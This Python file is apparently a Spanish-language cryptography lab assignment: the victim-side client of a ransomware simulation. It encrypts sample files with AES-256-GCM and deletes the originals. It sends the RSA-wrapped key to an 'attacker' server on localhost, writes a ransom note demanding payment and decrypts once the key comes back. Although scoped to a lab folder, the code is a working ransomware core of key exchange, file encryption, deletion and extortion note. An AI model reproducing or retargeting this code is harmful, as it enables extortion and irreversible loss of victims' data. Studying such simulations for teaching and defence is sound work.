

import os, json, base64, struct, datetime, socket
from pathlib import Path
from Crypto.Util import number
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


IP       = '127.0.0.1'
PORT     = 9999
KL       = 32        
CABECERA = b"AG02"
NL       = 12         
TL       = 16          
BLOQUE   = 64 * 1024  

class MyRSACRT:
    def Frsa(self, pk, x):
        """Cifrado RSA: c = x^e mod n."""
        n, e = pk
        return pow(x, e, n)
def setup():
    """Crea las carpetas lab/ y los archivos de ejemplo."""
    Path('lab/sample_plain').mkdir(parents=True, exist_ok=True)
    Path('lab/sample_cipher').mkdir(parents=True, exist_ok=True)

    muestras = {
        'lab/sample_plain/resumen_champions.txt': (
            "Atlético de Madrid cayó ante Barcelona por 2-1 en la vuelta de cuartos "
            "de final de la UEFA Champions League 2025/26 y se metió en las semifinales. "
            "Lamine Yamal y Ferrán Torres marcaron para el visitante, Ademola Lookman "
            "lo hizo para el local.\n\n"
            "Atlético Madrid aguantó frente al Barcelona y se metió en las semifinales "
            "de la UEFA Champions League.\n\n"
            "El Colchonero supo sufrir en el Estadio Metropolitano, aprovechó la ventaja "
            "de 2-0 del encuentro de ida y está entre los cuatro mejores de Europa.\n"
            "El arquero argentino Juan Musso fue la gran figura del partido, siendo clave "
            "con sus intervenciones para sostener a su equipo y mantenerlo dentro de la serie.\n"
            "Atlético Madrid espera por el ganador de la serie entre Arsenal y Sporting Lisboa.\n\n"
            "La primera parte fue puro vértigo en el Metropolitano. La mitad de la cancha, "
            "prácticamente, no existió y fue zona de tránsito mientras los equipos "
            "intercambiaban ataque por ataque."
        ),
        'lab/sample_plain/notas_lab.txt': (
            "trabajo de criptografia:\n"
            "- revisiones de los requerimientos\n"
            "- Terminar el informe de criptografia\n"
        )
    }

    for ruta, cont in muestras.items():
        with open(ruta, 'w', encoding='utf-8') as f:
            f.write(cont)
        print(f"[+] Archivo de prueba creado: {ruta}")

    print("\nArchivos listos en la carpeta original:")
    for f in sorted(Path('lab/sample_plain').iterdir()):
        print(f"  {f.name}  ({f.stat().st_size} bytes)")

def cifrar_archivo(entrada, ksym, salida):
    """Cifra un archivo con AES-256-GCM y escribe cabecera + ciphertext."""
    nonce = get_random_bytes(NL)
    aes   = AES.new(ksym, AES.MODE_GCM, nonce=nonce, mac_len=TL)
    tam   = os.path.getsize(entrada)
    cab   = CABECERA + nonce + b'\x00' * TL + struct.pack("!Q", tam)

    with open(entrada, 'rb') as fi, open(salida, 'wb') as fo:
        fo.write(cab)
        while True:
            bloque = fi.read(BLOQUE)
            if not bloque:
                break
            fo.write(aes.encrypt(bloque))
        
        fo.seek(len(CABECERA) + NL)
        fo.write(aes.digest())

def descifrar_archivo(entrada, ksym, salida):
    """Descifra un archivo .enc y verifica el tag de autenticación."""
    with open(entrada, 'rb') as fi:
        assert fi.read(4) == CABECERA, "Cabecera inválida"
        nonce  = fi.read(NL)
        tag    = fi.read(TL)
        (tam,) = struct.unpack("!Q", fi.read(8))
        aes    = AES.new(ksym, AES.MODE_GCM, nonce=nonce, mac_len=TL)

        with open(salida, 'wb') as fo:
            while True:
                bloque = fi.read(BLOQUE)
                if not bloque:
                    break
                fo.write(aes.decrypt(bloque))
            aes.verify(tag)

   
    with open(salida, 'rb+') as fo:
        fo.truncate(tam)


def recibir_completo(conn, n):
    buf = b''
    while len(buf) < n:
        t = conn.recv(n - len(buf))
        if not t:
            raise ConnectionError("Conexión cerrada inesperadamente")
        buf += t
    return buf

def mandar_json(conn, d):
    m = json.dumps(d).encode()
    conn.sendall(len(m).to_bytes(4, 'big') + m)

def leer_json(conn):
    n = int.from_bytes(recibir_completo(conn, 4), 'big')
    return json.loads(recibir_completo(conn, n).decode())

def fase1_cifrado():
    """
    Conecta al atacante, recibe pk, genera Ksym,
    cifra archivos, envía c = FRSA(pk, Ksym), borra Ksym.
    Devuelve la lista de archivos cifrados.
    """
    print(f"\n[Víctima] Conectando al servidor {IP}:{PORT}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))

    msg = leer_json(s)
    n, e = msg['n'], msg['e']
    pk = (n, e)
    print(f"[Víctima] Recibí la llave pública del atacante")

   
    ksym = get_random_bytes(KL)
    ksym_int = int.from_bytes(ksym, 'big')
    assert ksym_int < n, "Ksym debe ser menor que n"


    cifrados = []
    for arch in sorted(Path('lab/sample_plain').iterdir()):
        if arch.is_file():
            dest = Path('lab/sample_cipher') / (arch.name + '.enc')
            cifrar_archivo(str(arch), ksym, str(dest))
            arch.unlink()
            cifrados.append(str(dest))
            print(f"  -> Cifrando archivo: {arch.name}")

   
    rsa = MyRSACRT()
    c = rsa.Frsa(pk, ksym_int)
    mandar_json(s, {'tipo': 'ciphertext', 'c': c})
    print(f"[Víctima] Clave cifrada enviada al atacante")

    s.recv(8) 


    ksym = b'\x00' * KL
    del ksym
    print("[Víctima] Clave Ksym eliminada de la memoria local")

    s.close()
    return cifrados


def generar_nota(cifrados):
    """Genera el archivo ransom_note.txt."""
    hora  = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    lista = '\n'.join(f'- {a}' for a in cifrados)

    nota = (
        "¡ATENCION! ARCHIVOS CIFRADOS\n\n"
        f"Fecha: {hora}\n"
        f"Algoritmo: AES-256-GCM\n\n"
        f"Archivos afectados:\n{lista}\n\n"
        "Para recuperar sus archivos, contacte al atacante\n"
        "y realice el pago solicitado.\n"
    )

    with open('ransom_note.txt', 'w', encoding='utf-8') as f:
        f.write(nota)
    print("\n[Víctima] Archivo ransom_note.txt generado.")


def fase2_recuperacion():
    """
    Reconecta al atacante, recibe Ksym tras el 'pago',
    y descifra los archivos.
    """
    print(f"\n[Víctima] Reconectando a {IP}:{PORT} para recuperar archivos...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))

    msg  = leer_json(s)
    ksym = base64.b64decode(msg['ksym'])
    print(f"[Víctima] Clave recuperada exitosamente")

    Path('lab/sample_plain').mkdir(exist_ok=True)
    for arch in sorted(Path('lab/sample_cipher').iterdir()):
        if arch.suffix == '.enc':
            dest = Path('lab/sample_plain') / arch.stem
            descifrar_archivo(str(arch), ksym, str(dest))
            print(f"  -> Archivo restaurado: {arch.name}")

    s.sendall(b'OK\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
    s.close()


def main():
    print("=" * 50)
    print("   VÍCTIMA — Simulación Ransomware (Modelo B)")
    print("=" * 50)

   
    setup()

    
    print("\n" + "=" * 40)
    print("  FASE 1: ATAQUE Y CIFRADO")
    print("=" * 40)

    cifrados = fase1_cifrado()
    generar_nota(cifrados)


    print("\nRevisando carpeta original:")
    resto = list(Path('lab/sample_plain').iterdir())
    if not resto:
        print("  -> Carpeta vacía (archivos eliminados)")
    else:
        print([f.name for f in resto])

    print("\nArchivos cifrados:")
    for f in sorted(Path('lab/sample_cipher').iterdir()):
        print(f"  {f.name}  ({f.stat().st_size} bytes)")

    
    print("\n" + "-" * 40)
    input("[Víctima] Presione ENTER para solicitar la recuperación...")

 
    print("\n" + "=" * 40)
    print("  FASE 2: PAGO Y RECUPERACIÓN")
    print("=" * 40)

    fase2_recuperacion()

    
    print("\nComprobando archivos restaurados:")
    for f in sorted(Path('lab/sample_plain').iterdir()):
        with open(f, encoding='utf-8') as rf:
            primera_linea = rf.readline().strip()
            print(f"  {f.name}: '{primera_linea[:50]}...'")

    print("\n*** VÍCTIMA: SIMULACIÓN TERMINADA CON ÉXITO ***\n")

if __name__ == '__main__':
    main()